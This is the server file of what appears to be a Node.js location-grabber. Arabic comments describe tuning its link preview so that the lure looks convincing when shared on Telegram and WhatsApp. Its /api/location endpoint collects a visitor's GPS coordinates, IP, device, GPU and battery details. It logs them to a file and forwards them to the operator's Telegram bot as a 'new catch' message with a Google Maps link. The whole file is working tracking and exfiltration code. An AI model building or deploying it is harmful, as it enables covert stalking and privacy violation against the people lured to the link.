require('dotenv').config();
const express = require('express');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// الصفحة الرئيسية مع حقن الرابط الكامل للمعاينة لضمان ظهور الصورة في تلجرام وواتساب
app.get('/', (req, res) => {
    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');

    // تحديد الرابط الكامل للسيرفر (يدعم Render والعمل المحلي)
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const fullUrl = protocol + '://' + req.get('host');

    // إضافة بصمة زمنية عشوائية لإجبار الواتساب على التحديث
    // تغيير الصورة إلى jpg/png لضمان التوافقية العالية مع واتساب
    const imageUrl = fullUrl + '/preview.webp?v=' + Date.now();

    // استبدالات ديناميكية وإجبارية
    html = html.replace(/SITE_URL/g, fullUrl);
    html = html.replace(/\/preview\.webp/g, imageUrl);

    // إضافة هيدر خاص لمنع واتساب من التقاط الكاش
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');

    res.send(html);
});

app.post('/api/location', async (req, res) => {
    const data = req.body;
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const clientIp = data.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // جلب معلومات إضافية من الـ IP إذا لم تكن موجودة
    let geoInfo = {
        country: data.country || 'غير معروف',
        city: data.city || 'غير معروف',
        isp: data.isp || 'غير معروف'
    };

    const flag = (data.countryCode || '🌐');

    // تحديد نوع الجهاز من الـ User-Agent بشكل أدق للتلجرام
    const ua = data.userAgent || '';
    const deviceType = /iPhone|iPad|iPod/i.test(ua) ? ' iPhone' : (/Android/i.test(ua) ? '🤖 Android' : '💻 PC');

    const message = `
🎯 *صيد جديد (${deviceType})*
━━━━━━━━━━━━━━━━━━
📱 *الجهاز:* \`${data.platform || 'N/A'}\`
├ *المتصفح:* \`${ua.split(' ').pop()}\`
├ *الشاشة:* \`${data.screen || 'N/A'}\`
└ *الجرافيك:* \`${data.gpu || 'N/A'}\`

🔋 *الطاقة:* \`${data.battery?.level || 'N/A'}\` (${data.battery?.charging === 'Yes' ? '⚡ شحن' : '🔋 تفريغ'})

🌐 *الشبكة:*
├ *IP:* \`${data.ip || clientIp}\`
└ *الموقع:* ${geoInfo.country} - ${geoInfo.city}

📍 *GPS:*
├ *العرض:* \`${data.latitude}\`
├ *الطول:* \`${data.longitude}\`
└ *الدقة:* 🎯 \`${data.accuracy}\`

🗺️ *خرائط جوجل:*
https://www.google.com/maps?q=${data.latitude},${data.longitude}
━━━━━━━━━━━━━━━━━━
`;

    console.log(`[${new Date().toISOString()}] New hit from ${deviceType} (${clientIp})`);

    // حفظ البيانات محلياً كنسخة احتياطية
    const logEntry = { ...data, deviceType, clientIp, timestamp: new Date().toISOString() };
    const logsPath = path.join(__dirname, 'logs.json');
    let logs = [];
    if (fs.existsSync(logsPath)) {
        try { logs = JSON.parse(fs.readFileSync(logsPath)); } catch (e) { logs = []; }
    }
    logs.push(logEntry);
    fs.writeFileSync(logsPath, JSON.stringify(logs, null, 2));

    if (!token || !chatId) {
        return res.json({ success: true, warning: 'Telegram config missing' });
    }

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error);
        res.status(500).json({ error: 'Failed' });
    }
});

// مسار للاختبار السريع من المتصفح
app.get('/api/test', async (req, res) => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: '🔔 اختبار: السيرفر متصل بتلجرام بنجاح!' })
        });
        res.send('✅ تم إرسال رسالة اختبار إلى تلجرام. تحقق من البوت!');
    } catch (e) {
        res.status(500).send('❌ فشل إرسال الرسالة: ' + e.message);
    }
});

app.listen(PORT, () => { console.log(`Server running on port ${PORT}`); });
